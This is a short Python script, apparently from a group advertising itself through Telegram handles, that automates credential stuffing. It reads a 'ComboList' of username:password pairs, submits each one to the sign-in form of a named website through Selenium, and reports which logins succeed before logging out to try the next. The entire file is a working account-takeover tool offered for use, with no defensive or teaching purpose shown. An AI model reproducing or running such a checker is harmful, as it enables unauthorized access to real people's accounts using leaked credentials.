# Zed-Team
# Channel Telegram : @FR13ND3
# Id Telegram : @Cra3ked

try:
    from selenium import webdriver
except Exception:
    import os
    os.system('pip install selenuim')
from time import sleep

driver = webdriver.Firefox()
n_cb = input('Please Enter name ComboList : ')
if n_cb.endswith('.txt'):
    pass
else:
    n_cb = n_cb + ".txt"
driver.get('https://1tinymvz.net/signin/')
with open(n_cb,'r') as rf:
    for i in rf.readlines():
        i = str(i.replace('\n',''))
        i = i.split(':')
        username = i[0]
        password = i[1]
        i_user = driver.find_element_by_xpath('//*[@id="user_login"]').send_keys(username)
        i_pass = driver.find_element_by_xpath('//*[@id="user_pass"]').send_keys(password)
        btn_login = driver.find_element_by_xpath('//*[@id="loginform"]/div[3]/input[1]')
        btn_login.click()
        try:
            driver.find_element_by_xpath('//*[@id="theme-my-login"]/main/section/p[1]')
            print(f'username : {username} , Password : {password} , Result : Login Failed !!! ( Password Not Crrect)')
        except Exception:
            print(f'username : {username} , Password : {password} , Result : Logined !!!')
            # sleep(2)
            btn_logout = driver.find_element_by_xpath('//*[@id="MainNavbar"]/div/div/ul/li[4]/a')
            btn_logout.click()   
            # sleep(2)
            driver.get('https://1tinymvz.net/signin/')